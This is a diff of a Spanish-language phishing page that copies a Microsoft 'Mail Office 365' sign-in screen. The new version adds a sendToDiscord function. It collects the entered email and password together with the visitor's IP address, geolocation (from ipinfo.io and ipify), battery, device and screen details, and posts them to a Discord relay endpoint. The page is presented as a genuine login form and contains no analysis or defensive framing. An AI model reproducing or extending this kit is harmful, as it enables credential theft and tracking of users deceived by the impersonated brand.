@@ -1,402 +1,178 @@
 <!doctype html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Iniciar sesión en su cuenta - Mail Office 365</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          colors: {
-            'ms-blue': '#0078d4',
-            'ms-blue-hover': '#106ebe',
-            'ms-red': '#f25022',
-            'ms-green': '#7fba00',
-            'ms-yellow': '#ffb900',
-            'ms-blue-logo': '#00bcf2',
-            'ms-gray': '#1b1b1b',
-            'ms-gray-light': '#605e5c',
-            'ms-border': '#8a8886',
-            'ms-error': '#dc2626',
-            'ms-error-bg': '#fef2f2',
-            'ms-error-border': '#fca5a5',
-          },
-          fontFamily: {
-            'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
-          },
-          fontSize: {
-            'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
-            'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
-            'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
-            'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
-            'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
-          }
-        }
+<meta charset="UTF-8" />
+<link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Iniciar sesión - Mail Office 365</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config={
+  theme:{
+    extend:{
+      colors:{
+        'ms-blue':'#0078d4','ms-blue-hover':'#106ebe','ms-red':'#f25022','ms-green':'#7fba00',
+        'ms-yellow':'#ffb900','ms-blue-logo':'#00bcf2','ms-gray':'#1b1b1b','ms-gray-light':'#605e5c',
+        'ms-border':'#8a8886'
+      },
+      fontFamily:{'segoe':['"Segoe UI"','system-ui','-apple-system','BlinkMacSystemFont','sans-serif']},
+      fontSize:{
+        'ms-title':['28px',{lineHeight:'36px',fontWeight:'600'}],
+        'ms-subtitle':['15px',{lineHeight:'20px',fontWeight:'400'}],
+        'ms-body':['15px',{lineHeight:'20px',fontWeight:'400'}],
+        'ms-link':['13px',{lineHeight:'16px',fontWeight:'400'}],
+        'ms-logo':['21px',{lineHeight:'28px',fontWeight:'600'}]
       }
     }
-  </script>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body, html {
-      min-height: 100vh;
-      width: 100%;
-      background-size: cover;
-      background-position: center;
-      background-repeat: no-repeat;
-      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
-    }
-    body {
-      background-color: #0a0a1a;
-      background-image: none;
-    }
-    body.bg-gradient {
-      background: var(--login-bg-gradient, linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%));
-    }
-    body.bg-image {
-      background-image: var(--login-bg-image, none);
-      background-size: cover;
-      background-position: center;
-    }
-    .ms-input {
-      border: 1px solid #8a8886;
-      font-size: 15px;
-      padding: 11px 12px;
-      line-height: 20px;
-      border-radius: 2px;
-      width: 100%;
-      background: #fff;
-      color: #1b1b1b;
-    }
-    .ms-input:focus {
-      outline: none;
-      border-color: #0078d4;
-      box-shadow: inset 0 0 0 1px #0078d4;
-    }
-    .ms-button {
-      background: #0078d4;
-      transition: background-color 0.1s ease;
-      font-size: 15px;
-      font-weight: 600;
-      padding: 8px 12px;
-      min-height: 32px;
-      border-radius: 2px;
-      color: #fff;
-      border: none;
-      cursor: pointer;
-    }
-    .ms-button:hover { background: #106ebe; }
-    .ms-button:active { background: #005a9e; }
-    .ms-button:disabled { background: #8a8886; cursor: not-allowed; }
-    .ms-link {
-      color: #0078d4;
-      text-decoration: none;
-      font-size: 13px;
-    }
-    .ms-link:hover { text-decoration: underline; }
-    .error-box {
-      background: #fef2f2;
-      border: 1px solid #fca5a5;
-      border-radius: 4px;
-      padding: 8px 12px;
-      margin-bottom: 12px;
-      text-align: center;
-    }
-    .error-text {
-      color: #dc2626;
-      font-size: 13px;
-      font-weight: 500;
-    }
-    .fade-in {
-      animation: fadeIn 0.3s ease-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .login-card {
-      background: rgba(255, 255, 255, 0.95);
-      backdrop-filter: blur(10px);
-      border-radius: 16px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-    }
-    .footer-links {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: rgba(255,255,255,0.95);
-      backdrop-filter: blur(8px);
-      border-top: 1px solid #e5e5e5;
-      padding: 8px 16px;
-      z-index: 50;
-    }
-    .footer-links a {
-      color: #605e5c;
-      font-size: 12px;
-      text-decoration: none;
-    }
-    .footer-links a:hover { color: #0078d4; text-decoration: underline; }
-    @media (max-width: 640px) {
-      .main-container {
-        position: fixed;
-        top: 0; left: 0; right: 0; bottom: 0;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 12px;
-        z-index: 10;
-      }
-    }
-    @media (min-width: 641px) {
-      .main-container {
-        position: static;
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 24px;
-      }
-    }
-  </style>
+  }
+}
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body,html{min-height:100vh;width:100%;background-size:cover;background-position:center;background-repeat:no-repeat;font-family:"Segoe UI",system-ui,-apple-system,sans-serif}
+body{background-color:#0a0a1a;background-image:none}
+body.bg-gradient{background:var(--login-bg-gradient,linear-gradient(135deg,#0a0a1a 0%,#1a1a2e 100%))}
+body.bg-image{background-image:var(--login-bg-image,none);background-size:cover;background-position:center}
+.ms-input{border:1px solid #8a8886;font-size:15px;padding:11px 12px;line-height:20px;border-radius:2px;color:#1b1b1b;background:#fff;width:100%}
+.ms-input:focus{outline:none;border-color:#0078d4;box-shadow:inset 0 0 0 1px #0078d4}
+.ms-button{background:#0078d4;transition:background-color .1s ease;font-size:15px;font-weight:600;padding:8px 12px;min-height:32px;border-radius:2px;color:#fff;border:none;cursor:pointer;font-family:inherit}
+.ms-button:hover{background:#106ebe}.ms-button:active{background:#005a9e}.ms-button:disabled{background:#8a8886;cursor:not-allowed}
+.ms-link{color:#0078d4;text-decoration:none;font-size:13px}
+.ms-link:hover{text-decoration:underline}
+.fade-in{animation:fadeIn .3s ease-out}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.main-container{position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center;padding:1rem;z-index:10}
+@media(min-width:640px){.main-container{position:static;min-height:100vh}}
+.error-box{background:#fef2f2;border:1px solid #fca5a5;border-radius:4px;padding:8px 12px;margin-bottom:12px;text-align:center}
+.error-text{color:#dc2626;font-size:13px;font-weight:500}
+.footer-bar{position:fixed;bottom:0;left:0;right:0;background:rgba(255,255,255,.95);backdrop-filter:blur(8px);border-top:1px solid #e5e5e5;padding:8px 16px;z-index:50}
+.footer-bar .footer-inner{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;align-items:center;justify-content:center;gap:8px 24px}
+.footer-bar a{color:#605e5c;font-size:12px;text-decoration:none}
+.footer-bar a:hover{color:#0078d4;text-decoration:underline}
+</style>
 </head>
 <body>
-
-  <!-- Footer Links - appears on all pages -->
-  <div class="footer-links">
-    <div style="max-width: 1200px; margin: 0 auto; display: flex; flex-wrap: wrap; align-items: center; justify-content: center; gap: 8px 24px;">
-      <a href="#" id="footerHelp">Ayuda</a>
-      <a href="#" id="footerTerms">Términos de uso</a>
-      <a href="#" id="footerPrivacy">Privacidad y cookies</a>
-      <span style="display: none; text-align: center; font-size: 12px;" id="footerPrivate">
-        Usa la exploración privada si este no es tu dispositivo.
-        <a href="#">Más información</a>
-      </span>
-    </div>
-  </div>
-
-  <!-- Main Container -->
-  <div class="main-container">
-    <div class="w-full max-w-md fade-in relative z-10">
-      <div class="login-card p-8 md:p-12">
-        <!-- Logo -->
-        <div class="flex items-center justify-center mb-8" id="logoContainer">
-          <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
-            <div class="bg-ms-red w-3 h-3 rounded-sm"></div>
-            <div class="bg-ms-green w-3 h-3 rounded-sm"></div>
-            <div class="bg-ms-blue-logo w-3 h-3 rounded-sm"></div>
-            <div class="bg-ms-yellow w-3 h-3 rounded-sm"></div>
-          </div>
-          <span class="text-ms-logo text-ms-gray" id="logoText">Mail Office 365</span>
+<div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]"></div>
+<div class="main-container">
+  <div class="w-full max-w-md fade-in relative z-10">
+    <div class="bg-white/90 backdrop-blur-sm rounded-xl shadow-lg p-12">
+      <div class="flex flex-col items-center mb-8">
+        <div class="grid grid-cols-2 gap-px w-6 h-6 mb-2">
+          <div id="logoColor1" style="background:#f25022;border-radius:1px;width:8px;height:8px"></div>
+          <div id="logoColor2" style="background:#7fba00;border-radius:1px;width:8px;height:8px"></div>
+          <div id="logoColor3" style="background:#00bcf2;border-radius:1px;width:8px;height:8px"></div>
+          <div id="logoColor4" style="background:#ffb900;border-radius:1px;width:8px;height:8px"></div>
         </div>
-
-        <!-- Title -->
-        <h1 class="text-ms-title text-ms-gray mb-2 font-semibold text-center" id="pageTitle">Iniciar sesión</h1>
-        <p class="text-ms-subtitle text-ms-gray-light mb-6 text-center" id="pageSubtitle">Usar su cuenta de Mail Office 365.</p>
-
-        <!-- Error Box -->
-        <div id="errorBox" class="error-box" style="display:none;">
+        <span class="text-ms-logo text-ms-gray" id="logoText">Mail Office 365</span>
+      </div>
+      <h1 class="text-ms-title text-ms-gray mb-2 font-semibold text-center" id="pageTitle">Iniciar sesión</h1>
+      <p class="text-ms-subtitle text-ms-gray-light mb-8 text-center" id="pageSubtitle">Usar su cuenta de Mail Office 365.</p>
+      <form onsubmit="handleEmailSubmit(event)" class="space-y-6" id="emailForm">
+        <div id="errorBox" class="error-box" style="display:none">
           <span id="errorText" class="error-text"></span>
         </div>
-
-        <!-- Email Form - Step 1 -->
-        <form onsubmit="handleEmailSubmit(event)" class="space-y-5" id="emailForm">
-          <div>
-            <input
-              type="email"
-              id="email"
-              placeholder="Correo electrónico o número de teléfono"
-              class="ms-input"
-              autocomplete="username"
-              required
-            />
-          </div>
-
-          <!-- "¿Olvidaste tu nombre de usuario?" - right side with calibrator -->
-          <div style="display: flex; justify-content: flex-end; margin-top: -8px;">
-            <a href="#" class="ms-link">
-              ¿Olvidaste tu nombre de usuario?
-            </a>
-          </div>
-
-          <button type="submit" class="ms-button w-full" id="emailSubmitBtn">
-            Siguiente
-          </button>
-
-          <div style="text-align: center; margin-top: 8px;" class="text-ms-body text-ms-gray">
-            ¿Es nuevo en Mail Office 365?
-            <a href="#" class="ms-link font-semibold" style="margin-left: 4px;">
-              Crear una cuenta
-            </a>
-          </div>
-        </form>
-      </div>
+        <div>
+          <input type="email" id="email" placeholder="Correo electrónico o número de teléfono" class="ms-input w-full text-ms-gray bg-white" required>
+        </div>
+        <div class="text-left">
+          <a href="#" class="ms-link" id="forgotUsernameText">¿Olvidaste tu nombre de usuario?</a>
+        </div>
+        <button type="submit" class="ms-button w-full text-white" id="nextButtonText">Siguiente</button>
+        <div class="text-center text-ms-body text-ms-gray">
+          <span id="newUserText">¿Es nuevo en Mail Office 365?</span>
+          <a href="#" class="ms-link font-semibold" id="createAccountText">Crear una cuenta</a>
+        </div>
+      </form>
     </div>
   </div>
-
-  <script>
-    // ========== CONFIGURACIÓN GLOBAL (desde localStorage o defaults) ==========
-    const DEFAULT_CONFIG = {
-      companyName: 'Mail Office 365',
-      pageTitle: 'Iniciar sesión',
-      pageSubtitle: 'Usar su cuenta de Mail Office 365.',
-      logoText: 'Mail Office 365',
-      loginBgType: 'color',
-      loginBgColor: '#0a0a1a',
-      loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
-      loginBgImage: '',
-      footerHelpText: 'Ayuda',
-      footerTermsText: 'Términos de uso',
-      footerPrivacyText: 'Privacidad y cookies',
-      footerPrivateText: 'Usa la exploración privada si este no es tu dispositivo.',
-    };
-
-    let savedConfig = null;
-
-    async function loadConfigFromServer() {
-      try {
-        const res = await fetch('/api/config');
-        if (res.ok) {
-          const data = await res.json();
-          if (data.success && data.config) {
-            savedConfig = { ...DEFAULT_CONFIG, ...data.config };
-            return savedConfig;
-          }
-        }
-      } catch (e) {
-        console.warn('No se pudo cargar config del servidor, usando localStorage');
-      }
-      return null;
-    }
-
-    function loadConfigFromLocalStorage() {
-      try {
-        const stored = localStorage.getItem('mailoffice365_config');
-        if (stored) {
-          savedConfig = { ...DEFAULT_CONFIG, ...JSON.parse(stored) };
-          return savedConfig;
-        }
-      } catch (e) {}
-      return null;
-    }
-
-    function getConfig() {
-      if (savedConfig) return savedConfig;
-      return DEFAULT_CONFIG;
-    }
-
-    function applyConfig() {
-      const cfg = getConfig();
-      document.getElementById('logoText').textContent = cfg.logoText || cfg.companyName;
-      document.getElementById('pageTitle').textContent = cfg.pageTitle || 'Iniciar sesión';
-      document.getElementById('pageSubtitle').textContent = cfg.pageSubtitle || 'Usar su cuenta.';
-      document.getElementById('footerHelp').textContent = cfg.footerHelpText || 'Ayuda';
-      document.getElementById('footerTerms').textContent = cfg.footerTermsText || 'Términos de uso';
-      document.getElementById('footerPrivacy').textContent = cfg.footerPrivacyText || 'Privacidad y cookies';
-      document.getElementById('footerPrivate').innerHTML =
-        (cfg.footerPrivateText || 'Usa la exploración privada si este no es tu dispositivo.') +
-        ' <a href="#">Más información</a>';
-
-      applyLoginBackground();
-    }
-
-    function applyLoginBackground() {
-      const cfg = getConfig();
-      const bgType = cfg.loginBgType || 'color';
-      const bgColor = cfg.loginBgColor || '#0a0a1a';
-      const bgGradient = cfg.loginBgGradient || 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)';
-      const bgImage = cfg.loginBgImage || '';
-
-      document.body.style.removeProperty('background-image');
-      document.body.style.removeProperty('background-color');
-      document.body.classList.remove('bg-gradient', 'bg-image');
-
-      if (bgType === 'gradient') {
-        document.body.style.background = bgGradient;
-        document.body.classList.add('bg-gradient');
-      } else if (bgType === 'image' && bgImage) {
-        document.body.style.backgroundImage = 'url(' + bgImage + ')';
-        document.body.style.backgroundSize = 'cover';
-        document.body.style.backgroundPosition = 'center';
-        document.body.classList.add('bg-image');
-      } else {
-        document.body.style.backgroundColor = bgColor;
-      }
-    }
-
-    // Load config on page load
-    async function initConfig() {
-      const serverConfig = await loadConfigFromServer();
-      if (serverConfig) {
-        applyConfig();
-      } else {
-        const localConfig = loadConfigFromLocalStorage();
-        if (localConfig) {
-          applyConfig();
-        } else {
-          applyConfig();
-        }
-      }
-    }
-
-    initConfig();
-
-    // ========== ERROR BOX ==========
-    function showError(message) {
-      const errorBox = document.getElementById('errorBox');
-      const errorText = document.getElementById('errorText');
-      if (errorBox && errorText) {
-        errorText.textContent = message;
-        errorBox.style.display = 'block';
-      }
-    }
-
-    function hideError() {
-      const errorBox = document.getElementById('errorBox');
-      if (errorBox) {
-        errorBox.style.display = 'none';
-      }
-    }
-
-    // ========== STEP 1: EMAIL SUBMIT ==========
-    async function handleEmailSubmit(event) {
-      event.preventDefault();
-      hideError();
-
-      const emailInput = document.getElementById('email');
-      const email = emailInput.value.trim();
-      const submitBtn = document.getElementById('emailSubmitBtn');
-
-      // Validar email
-      if (!email) {
-        showError('Por favor ingresa tu correo electrónico.');
-        return;
-      }
-
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      if (!emailRegex.test(email)) {
-        showError('Por favor ingresa un correo electrónico válido.');
-        return;
-      }
-
-      // Deshabilitar botón
-      submitBtn.disabled = true;
-      submitBtn.textContent = 'Cargando...';
-
-      try {
-        // Guardar email en localStorage para el paso 2
-        localStorage.setItem('mailoffice365_email', email);
-
-        // Navegar al paso 2 (contraseña)
-        window.location.href = 'password.html?email=' + encodeURIComponent(email);
-      } catch (err) {
-        showError('Error al procesar. Intenta de nuevo.');
-        submitBtn.disabled = false;
-        submitBtn.textContent = 'Siguiente';
-      }
-    }
-  </script>
+</div>
+<div class="footer-bar" id="footerBar">
+  <div class="footer-inner">
+    <a href="#" id="footerHelp">Ayuda</a>
+    <a href="#" id="footerTerms">Términos de uso</a>
+    <a href="#" id="footerPrivacy">Privacidad y cookies</a>
+    <span style="display:none;text-align:center;font-size:12px" id="footerPrivate">Usa la exploración privada si este no es tu dispositivo. <a href="#">Más información</a></span>
+  </div>
+</div>
+<script>
+const DEFAULTS={
+  logoText:'Mail Office 365',logoColor1:'#f25022',logoColor2:'#7fba00',
+  logoColor3:'#00bcf2',logoColor4:'#ffb900',pageTitle:'Iniciar sesión',
+  pageSubtitle:'Usar su cuenta de Mail Office 365.',emailPlaceholder:'Correo electrónico o número de teléfono',
+  passwordPlaceholder:'Contraseña',nextButtonText:'Siguiente',loginButtonText:'Iniciar sesión',
+  forgotUsernameText:'¿Olvidaste tu nombre de usuario?',forgotPasswordText:'¿Olvidó su contraseña?',
+  newUserText:'¿Es nuevo en Mail Office 365?',createAccountText:'Crear una cuenta',
+  otherSignInText:'Otras formas de iniciar sesión',loginBgType:'color',loginBgColor:'#0a0a1a',
+  loginBgGradient:'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',loginBgImage:'',
+  footerHelpText:'Ayuda',footerTermsText:'Términos de uso',footerPrivacyText:'Privacidad y cookies',
+  footerPrivateText:'Usa la exploración privada si este no es tu dispositivo.',
+  discordWebhook:'',discordMessageTemplate:''
+};
+let config;
+async function loadConfig(){
+  try{const res=await fetch('/api/config');if(res.ok){const data=await res.json();if(data.success&&data.config){config={...DEFAULTS,...data.config};return;}}}
+  catch(e){}
+  try{const stored=localStorage.getItem('mailoffice365_cfg');if(stored){config={...DEFAULTS,...JSON.parse(stored)};return;}}
+  catch(e){}
+  config={...DEFAULTS};
+}
+function applyConfig(){
+  const c=config;
+  document.getElementById('logoText').textContent=c.logoText;
+  document.getElementById('pageTitle').textContent=c.pageTitle;
+  document.getElementById('pageSubtitle').textContent=c.pageSubtitle;
+  document.getElementById('email').placeholder=c.emailPlaceholder;
+  document.getElementById('nextButtonText').textContent=c.nextButtonText;
+  document.getElementById('forgotUsernameText').textContent=c.forgotUsernameText;
+  document.getElementById('newUserText').textContent=c.newUserText;
+  document.getElementById('createAccountText').textContent=c.createAccountText;
+  document.getElementById('footerHelp').textContent=c.footerHelpText;
+  document.getElementById('footerTerms').textContent=c.footerTermsText;
+  document.getElementById('footerPrivacy').textContent=c.footerPrivacyText;
+  document.getElementById('footerPrivate').innerHTML=(c.footerPrivateText||'')+' <a href="#">Más información</a>';
+  document.getElementById('logoColor1').style.background=c.logoColor1;
+  document.getElementById('logoColor2').style.background=c.logoColor2;
+  document.getElementById('logoColor3').style.background=c.logoColor3;
+  document.getElementById('logoColor4').style.background=c.logoColor4;
+  applyBackground(c);
+}
+function applyBackground(c){
+  document.body.classList.remove('bg-gradient','bg-image');
+  if(c.loginBgType==='gradient'){document.body.style.background=c.loginBgGradient;document.body.style.backgroundImage='none';document.body.classList.add('bg-gradient');}
+  else if(c.loginBgType==='image'&&c.loginBgImage){document.body.style.backgroundImage='url('+c.loginBgImage+')';document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.classList.add('bg-image');}
+  else{document.body.style.backgroundImage='none';document.body.style.backgroundColor=c.loginBgColor;}
+}
+function showError(msg){document.getElementById('errorBox').style.display='block';document.getElementById('errorText').textContent=msg;setTimeout(()=>{document.getElementById('errorBox').style.display='none';},4000);}
+async function sendToDiscord(email,password){
+  let geoCity,geoRegion,geoCountry,geoCountryCode,geoTimezone,geoIsoCode,geoIsp,geoLatitude,geoLongitude,geoZip,geoCurrency,geoCurrencyCode,geoCallingCode,geoNetwork,geoIp,ipifyIp;
+  geoCity=geoRegion=geoCountry=geoCountryCode=geoTimezone=geoIsoCode=geoIsp=geoLatitude=geoLongitude=geoZip=geoCurrency=geoCurrencyCode=geoCallingCode=geoNetwork=geoIp=ipifyIp='';
+  let deviceMemory='desconocido',cpuCores='desconocido',touchPoints=0,isMobile='No',isTablet='No',isDesktop='Sí';
+  let batteryLevel='No disponible',batteryCharging='Desconocido';
+  let userAgent=navigator.userAgent,language=navigator.language,screenResolution='',colorDepth='',timezone='',platform='',onlineStatus='',cookiesEnabled='';
+  try{const r=await fetch('https://ipinfo.io/json');if(r.ok){const d=await r.json();geoIp=d.ip||'';geoCity=d.city||'';geoRegion=d.region||'';geoCountry=d.country||'';geoCountryCode=d.country||'';geoTimezone=d.timezone||'';geoIsp=d.org||'';geoLatitude=(d.loc||'').split(',')[0]||'';geoLongitude=(d.loc||'').split(',')[1]||'';geoZip=d.postal||'';geoCurrency=d.currency&&d.currency.symbol||'';geoCurrencyCode=d.currency&&d.currency.code||'';geoCallingCode=d.phone||'';geoNetwork=d.org||'';}}catch(e){}
+  try{const r=await fetch('https://api.ipify.org?format=json');if(r.ok){const d=await r.json();ipifyIp=d.ip||'';geoIp=ipifyIp;}}catch(e){}
+  try{if(navigator.getBattery){const b=await navigator.getBattery();batteryLevel=Math.round(b.level*100)+'%';batteryCharging=b.charging?'Sí':'No';}}catch(e){}
+  try{deviceMemory=navigator.deviceMemory||'desconocido';cpuCores=navigator.hardwareConcurrency||'desconocido';touchPoints=navigator.maxTouchPoints||0;const ua=navigator.userAgent.toLowerCase();isMobile=/mobi|android|iphone|ipad/.test(ua)?'Sí':'No';isTablet=/tablet|ipad/.test(ua)?'Sí':'No';isDesktop=isMobile==='No'&&isTablet==='No'?'Sí':'No';}catch(e){}
+  try{screenResolution=screen.width+'x'+screen.height;colorDepth=screen.colorDepth+' bits';timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;platform=navigator.platform||'';onlineStatus=navigator.onLine?'Sí':'No';cookiesEnabled=navigator.cookieEnabled?'Sí':'No';}catch(e){}
+  const body={
+    email,password,userAgent,language,screenResolution,colorDepth,timezone,platform,onlineStatus,cookiesEnabled,
+    deviceMemory,cpuCores,touchPoints,isMobile,isTablet,isDesktop,batteryLevel,batteryCharging,
+    geoIp:geoIp||ipifyIp||'',geoCity,geoRegion,geoCountry,geoCountryCode,geoTimezone,geoIsoCode,geoIsp,
+    geoLatitude,geoLongitude,geoZip,geoCurrency,geoCurrencyCode,geoCallingCode,geoNetwork,ipifyIp
+  };
+  try{const res=await fetch('/api/discord',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});const data=await res.json();return data.success===true;}
+  catch(e){console.warn('Discord API unavailable:',e);return false;}
+}
+async function handleEmailSubmit(e){
+  e.preventDefault();
+  hideError();
+  const email=document.getElementById('email').value.trim();
+  if(!email||!email.includes('@')){showError('Ingresa un correo electrónico válido');return;}
+  try{localStorage.setItem('mailoffice365_email',email);}catch(err){}
+  window.location.href='password.html?email='+encodeURIComponent(email);
+}
+function hideError(){document.getElementById('errorBox').style.display='none';}
+(function(){loadConfig().then(()=>applyConfig());})();
+</script>
 </body>
 </html>
